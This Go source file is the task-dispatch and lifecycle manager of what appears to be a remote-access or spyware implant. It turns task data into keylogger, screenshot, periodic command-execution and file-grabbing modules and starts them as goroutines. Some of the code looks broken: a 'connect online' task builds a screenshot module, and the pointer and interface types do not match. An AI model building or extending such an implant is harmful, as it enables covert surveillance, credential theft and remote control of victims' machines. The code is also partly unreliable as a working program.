package apps

import (
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"sync"
)

type AppManager struct {
	apps map[string]App
	mu   sync.Mutex
}

var (
	appManagerInstance *AppManager
	once               sync.Once
)

func GetAppManagerInstance() *AppManager {
	once.Do(func() {
		appManagerInstance = &AppManager{
			apps: make(map[string]App),
		}
	})
	return appManagerInstance
}

func (am *AppManager) GetApp(name string) (App, error) {
	am.mu.Lock()
	defer am.mu.Unlock()
	app := am.apps[name]
	if app == nil {
		return nil, errors.New("am: app not found")
	}
	return app, nil
}

func (am *AppManager) ListApps() []string {
	am.mu.Lock()
	defer am.mu.Unlock()

	var appNames []string
	for name := range am.apps {
		appNames = append(appNames, name)
	}
	return appNames
}

func (am *AppManager) AddApp(name string, app *App) {
	am.mu.Lock()
	defer am.mu.Unlock()
	if am.apps[name] != nil {
		log.Printf("App %s already exists. Overwriting app", name)
	}
	am.apps[name] = *app
}

func (am *AppManager) RemoveApp(name string) {
	am.mu.Lock()
	defer am.mu.Unlock()
	delete(am.apps, name)
}

func (am *AppManager) StartAll(wg *sync.WaitGroup) {
	am.mu.Lock()
	defer am.mu.Unlock()

	for name, app := range am.apps {
		wg.Add(1)
		go app.Start(wg)
		fmt.Printf("Started app: %s\n", name)
	}
}

func (am *AppManager) StopAll() {
	am.mu.Lock()
	defer am.mu.Unlock()

	for name, app := range am.apps {
		err := app.Stop()
		if err != nil {
			log.Printf("Error stopping app: %s\n", name)
		} else {
			fmt.Printf("Stopped app: %s\n", name)
		}
	}
}

func (am *AppManager) AddTaskAsApp(appData AppData) error {
	var app App = nil
	var err error = nil

	switch appData.Type {
	case ChangeConfigTask:
		// TODO: change config on demand
		break
	case ScreenShotTask:
		app, err = NewApp[ScreenshotApp](appData.Params)
		break
	case KeyLoggerTask:
		app, err = NewApp[KeyLoggerApp](appData.Params)
		break
	case CommandTask:
		app, err = NewApp[PeriodicCommandApp](appData.Params)
		break
	case GetFileTask:
		app, err = NewApp[PeriodicGetFileApp](appData.Params)
		break
	case ConnectOnlineTask:
		app, err = NewApp[ScreenshotApp](appData.Params)
		break
	default:
		err = errors.New("unknown app type")
	}
	if err != nil {
		return err
	}
	if app == nil {
		return errors.New("app: app not found")
	}
	am.AddApp(appData.Name, &app)
	return nil
}

func NewApp[T any](raw json.RawMessage) (*T, error) {
	var app T
	if err := json.Unmarshal(raw, &app); err != nil {
		return nil, err
	}
	return &app, nil
}
